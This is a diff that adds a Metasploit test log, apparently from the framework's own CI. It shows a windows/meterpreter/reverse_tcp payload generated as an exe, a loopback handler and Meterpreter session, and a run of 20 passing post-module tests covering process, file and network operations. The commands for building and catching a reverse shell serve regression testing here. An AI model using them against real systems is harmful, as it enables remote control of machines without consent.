@@ -1,0 +1,90 @@
+use windows/meterpreter/reverse_tcp
+msf6 post(test/railgun_reverse_lookups) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-djwe1rtxt
+msf6 payload(windows/meterpreter/reverse_tcp) > msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-djwe1rtxt
+msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-th5dax.exe -f exe AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-5u9y2ctxt MeterpreterDebugBuild=true
+[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-th5dax.exe...
+msf6 payload(windows/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-5u9y2ctxt MeterpreterDebugBuild=true
+[*] Payload Handler Started as Job 3
+msf6 payload(windows/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6004 
+[*] Sending stage (232014 bytes) to 127.0.0.1
+[*] Meterpreter session 4 opened (127.0.0.1:6004 -> 127.0.0.1:50000) at 2024-03-07 09:39:35 +0000
+use test/meterpreter
+msf6 post(test/meterpreter) > run session=4 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-aiyvcrqw
+[*] meterpreter-test-dir-aiyvcrqw created
+[*] Setup: Now in C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-aiyvcrqw
+[*] Running against session 4
+[*] Session type is meterpreter and platform is windows
+[*] Starting process tests
+[*] [should return its own process id] Pid: 1744
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>1744, "ppid"=>3104, "name"=>"child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-th5dax.exe", "path"=>"D:\\a\\_temp\\child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-th5dax.exe", "session"=>1, "user"=>"fv-az1457-886\\runneradmin", "arch"=>"x86"}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"fv-az1457-886", "OS"=>"Windows Server 2019 (10.0 Build 17763).", "Architecture"=>"x64", "BuildTuple"=>nil, "System Language"=>"en_US", "Domain"=>"WORKGROUP", "Logged On Users"=>1}
+[*] [should return the proper directory separator] Received separator "\\" - expected: "\\"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-aiyvcrqw
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "C:\\Users\\RUNNER~1\\AppData\\Local\\Temp\\meterpreter-test-dir-aiyvcrqw"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x000001e28aaa5938>:0x000001e2896b5e78 @stathash={"st_dev"=>0, "st_mode"=>16895, "st_nlink"=>0, "st_uid"=>0, "st_gid"=>0, "st_rdev"=>0, "st_ino"=>0, "st_size"=>0, "st_atime"=>1709804376, "st_mtime"=>1709804376, "st_ctime"=>1709804376}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-fzjghdwk
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-fzjghdwk
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-aiyvcrqw
+[*] [should change directories] New CWD: C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-aiyvcrqw\meterpreter-test-dir-fzjghdwk
+[*] [should change directories] Back to old CWD: C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-aiyvcrqw
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-fzjghdwk
+[*] [should create and remove files] Wrote to meterpreter-test-fzjghdwk, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-fzjghdwk.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-fzjghdwk
+[*] [should move files] Destination File Name: meterpreter-test-fzjghdwk-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-fzjghdwk
+[*] [should copy files] Destination File Name: meterpreter-test-fzjghdwk-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-fzjghdwk.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 2b44309ecb322a7e8f93dbe5e8cb96ed
+[*] [should do md5 and sha1 of files] local md5 : 2b44309ecb322a7e8f93dbe5e8cb96ed
+[*] [should do md5 and sha1 of files] remote sha: e406da25d194973ba711f9e057c1090729228d5d
+[*] [should do md5 and sha1 of files] local sha : e406da25d194973ba711f9e057c1090729228d5d
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Testing complete in 5.88 seconds
+[*] Passed: 20; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/meterpreter) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 4 closed.
+msf6 post(test/meterpreter) > Stopping all jobs...
